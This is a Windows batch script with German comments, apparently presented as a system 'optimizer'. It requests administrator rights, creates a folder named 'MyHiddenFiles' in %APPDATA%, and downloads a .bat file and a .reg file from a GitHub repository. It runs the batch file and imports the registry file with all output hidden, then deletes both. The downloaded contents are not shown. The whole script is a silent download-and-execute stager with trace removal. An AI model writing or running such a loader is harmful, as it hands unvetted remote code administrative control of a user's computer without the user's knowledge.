@echo off
setlocal enabledelayedexpansion

:: =============================
:: 1. Adminrechte prüfen
:: =============================
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: =============================
:: 2. %APPDATA% Ordner ermitteln
:: =============================
set "appDataPath=%APPDATA%\MyHiddenFiles"

:: =============================
:: 3. Ordner erstellen, falls er nicht existiert
:: =============================
if not exist "%appDataPath%" (
    mkdir "%appDataPath%"
)

:: =============================
:: 4. Dateipfade und URLs
:: =============================
set "batUrl=https://github.com/ZENZYLEovfwe/newest/raw/refs/heads/main/opti.bat"
set "regUrl=https://github.com/ZENZYLEovfwe/newest/raw/refs/heads/main/optimizter.reg"

set "batFile=%appDataPath%\opti.bat"
set "regFile=%appDataPath%\optimizter.reg"

:: =============================
:: 5. Dateien herunterladen
powershell -Command "Invoke-WebRequest -Uri '%batUrl%' -OutFile '%batFile%'" >nul 2>&1
if not exist "%batFile%" exit /b

powershell -Command "Invoke-WebRequest -Uri '%regUrl%' -OutFile '%regFile%'" >nul 2>&1
if not exist "%regFile%" exit /b

:: =============================
:: 6. Ausführen & Registry importieren
call "%batFile%" >nul 2>&1
reg import "%regFile%" >nul 2>&1

:: =============================
:: 7. Dateien löschen
del /f /q "%batFile%" >nul 2>&1
del /f /q "%regFile%" >nul 2>&1

:: =============================
:: 8. Kleines Delay vor dem Schließen
timeout /t 2 >nul
exit
